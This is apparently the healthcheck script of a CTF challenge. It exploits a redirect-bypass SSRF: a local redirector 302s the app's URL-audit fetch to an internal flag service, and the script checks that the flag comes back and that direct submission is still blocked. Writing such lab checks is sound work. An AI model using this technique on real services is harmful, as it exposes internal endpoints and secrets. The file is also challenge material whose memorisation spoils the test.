#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
healthcheck.py -- The Blind Side kCTF healthcheck

Actually exploits the redirect-bypass SSRF end to end:

  1. Start a small local redirector (redirector.py) that answers any
     GET with a 302 to http://flag-service:8080/secret-message.
  2. POST that redirector's own URL to LinkAudit Pro's /audit endpoint.
  3. Confirm the flag comes back in the audit report -- proof the
     frontend followed the redirect into its own internal service
     without ever re-checking where it was going.

Exit code 0 = healthy, non-zero = broken.
"""

import re
import sys

import requests

from redirector import serve_in_background, PORT

CHALLENGE_URL = "http://127.0.0.1:1337"
# Matches challenge/Dockerfile's /etc/hosts entry and the challenge
# container's TRUSTED_TEST_HOSTS env var (see challenge.yaml). The
# healthcheck and challenge containers share one pod's network
# namespace, so "127.0.0.1" from the challenge's point of view really
# does reach this container's listening socket -- but the CHALLENGE
# resolves the hostname "healthcheck-redirector" (not the literal
# string "127.0.0.1") when deciding whether to trust it, so a real
# player submitting "127.0.0.1" directly is still correctly blocked.
REDIRECTOR_HOST = "healthcheck-redirector"


def main():
    serve_in_background()

    submitted_url = f"http://{REDIRECTOR_HOST}:{PORT}/go"
    resp = requests.post(
        f"{CHALLENGE_URL}/audit",
        data={"url": submitted_url},
        timeout=10,
    )
    if resp.status_code != 200:
        print(f"unexpected status {resp.status_code}: {resp.text[:300]}")
        sys.exit(1)

    m = re.search(r"CTF\{[^}]+\}", resp.text)
    if not m:
        print("flag not found in audit report -- exploit failed")
        print(resp.text[:500])
        sys.exit(1)

    print("recovered:", m.group(0))

    # negative control -- direct submission of the internal endpoint
    # must still be blocked, otherwise this isn't testing the redirect
    # bypass at all, just a broken validator
    direct = requests.post(
        f"{CHALLENGE_URL}/audit",
        data={"url": "http://flag-service:8080/secret-message"},
        timeout=10,
    )
    if direct.status_code == 200 and "CTF{" in direct.text:
        print("direct submission of the internal endpoint was NOT blocked "
              "-- validator is broken, not just bypassable via redirect")
        sys.exit(1)

    sys.exit(0)


if __name__ == "__main__":
    main()
